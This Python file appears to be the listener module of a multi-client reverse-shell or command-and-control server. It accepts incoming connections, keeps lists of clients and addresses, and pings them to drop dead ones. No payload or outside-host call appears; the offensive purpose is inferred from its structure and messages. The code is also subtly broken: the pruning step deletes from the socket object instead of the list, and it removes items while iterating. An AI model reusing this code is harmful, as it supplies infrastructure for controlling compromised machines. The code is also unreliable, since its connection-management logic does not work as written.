from data.state import naomi

def accept_connections():
    for c in naomi.connections:
        c.close()

    del naomi.connections[:]
    del naomi.addresses[:]

    while True:
        try:
            connection, address = naomi.s.accept()
            naomi.s.setblocking(1) # prevents timeout

            naomi.connections.append(connection)
            naomi.addresses.append(address)

            print(f"\n[+] New Connection at {address[0]}, Port {address[1]}")

        except Exception as e:
            print(f"[!] Error accepting connections: {e}")


def refresh_connections():
    # results = ""

    for i, connection in enumerate(naomi.connections):
        try:
            connection.send(str.encode(" "))
            connection.recv(201480)
        except:
            del connection[i]
            del naomi.addresses[i]
            continue

    return len(naomi.connections)

    #     results = str(i) + "   " + str(naomi.addresses[i][0]) + "   " + str(naomi.addresses[i][1]) + "\n"

    # print("---- Clients----\n\n" + results)